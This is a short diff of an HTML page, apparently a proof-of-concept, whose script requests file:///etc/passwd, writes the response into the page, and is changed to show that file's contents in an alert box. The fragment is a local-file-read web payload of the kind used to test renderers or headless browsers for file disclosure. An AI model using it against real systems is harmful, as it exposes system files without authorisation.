@@ -9,7 +9,7 @@
     x.open("GET","file:///etc/passwd");x.send();
     console.log(this.responseText)
     document.getElementById("p1").innerHTML=this.responseText;
-    alert("Hello! I am an alert box!");
+    alert(this.responseText);
 
   </script>
 </html>
